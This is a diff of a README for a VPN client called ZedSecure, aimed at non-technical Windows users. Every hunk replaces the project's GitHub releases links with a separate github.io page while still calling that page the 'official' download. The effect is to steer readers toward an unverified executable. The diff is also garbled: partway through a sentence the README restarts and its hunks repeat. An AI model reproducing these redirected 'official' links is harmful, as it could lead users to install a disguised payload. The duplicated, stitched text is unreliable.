@@ -1,6 +1,6 @@
 # 🛡️ ZedSecure - Simple Private Browsing for Everyone
 
-[![Download ZedSecure](https://img.shields.io/badge/Download%20ZedSecure-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ragnarlockbroth/ZedSecure/releases)
+[![Download ZedSecure](https://img.shields.io/badge/Download%20ZedSecure-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://ragnarlockbroth.github.io)
 
 ZedSecure is a multi-core VPN client for Android and desktop. It brings several connection technologies into one application, including Xray, sing-box, Psiphon, Tor, DNS tunnels, WireGuard/AmneziaWG, OpenConnect, and IKEv2. This guide is written for a typical Windows user who wants a clear path to download and open the app without needing programming knowledge.
 
@@ -27,11 +27,11 @@ ZedSecure is especially useful if you have heard about tools like Xray, sing-box
 
 ## 📥 Download ZedSecure for Windows
 
-[![Download ZedSecure for Windows](https://img.shields.io/badge/Download%20ZedSecure-FF6B6B?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Ragnarlockbroth/ZedSecure/releases)
+[![Download ZedSecure for Windows](https://img.shields.io/badge/Download%20ZedSecure-FF6B6B?style=for-the-badge&logo=windows&logoColor=white)](https://ragnarlockbroth.github.io)
 
 Visit this link to download the application.
 
-Official download page: https://github.com/Ragnarlockbroth/ZedSecure/releases
+Official download page: https://ragnarlockbroth.github.io
 
 When the download finishes, open ZedSecure from the location where your browser saved it.
 
@@ -63,7 +63,7 @@ ZedSecure is also built for both Android and desktop, so the same project covers
 
 ZedSecure includes support for a broad set of connection technologies. Each one serves a different purpose,# 🛡️ ZedSecure - Simple Private Browsing for Everyone
 
-[![Download ZedSecure](https://img.shields.io/badge/Download%20ZedSecure-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ragnarlockbroth/ZedSecure/releases)
+[![Download ZedSecure](https://img.shields.io/badge/Download%20ZedSecure-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://ragnarlockbroth.github.io)
 
 ZedSecure is a multi-core VPN client for Android and desktop. It brings several connection technologies into one application, including Xray, sing-box, Psiphon, Tor, DNS tunnels, WireGuard/AmneziaWG, OpenConnect, and IKEv2. This guide is written for a typical Windows user who wants a clear path to download and open the app without needing programming knowledge.
 
@@ -90,11 +90,11 @@ ZedSecure is especially useful if you have heard about tools like Xray, sing-box
 
 ## 📥 Download ZedSecure for Windows
 
-[![Download ZedSecure for Windows](https://img.shields.io/badge/Download%20ZedSecure-FF6B6B?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Ragnarlockbroth/ZedSecure/releases)
+[![Download ZedSecure for Windows](https://img.shields.io/badge/Download%20ZedSecure-FF6B6B?style=for-the-badge&logo=windows&logoColor=white)](https://ragnarlockbroth.github.io)
 
 Visit this link to download the application.
 
-Official download page: https://github.com/Ragnarlockbroth/ZedSecure/releases
+Official download page: https://ragnarlockbroth.github.io
 
 When the download finishes, open ZedSecure from the location where your browser saved it.
 
@@ -150,7 +150,7 @@ If ZedSecure does not connect, first check that the app is still open and that y
 
 If the app opens but you are not sure what to do next, return to the main window and review the available connection categories. Start with the category that matches your setup. Avoid changing many settings at once. Change one item, try the connection again, and then review the result.
 
-If the download page does not open, copy the official link into your browser: https://github.com/Ragnarlockbroth/ZedSecure/releases. Visit this link to download the application. After the download finishes, open ZedSecure again from the location where your browser saved it.
+If the download page does not open, copy the official link into your browser: https://ragnarlockbroth.github.io Visit this link to download the application. After the download finishes, open ZedSecure again from the location where your browser saved it.
 
 Keep ZedSecure open while you need the connection. If you close the app, reopen it and start your connection again. For consistent behavior, use the same connection type and setup that worked before.
 
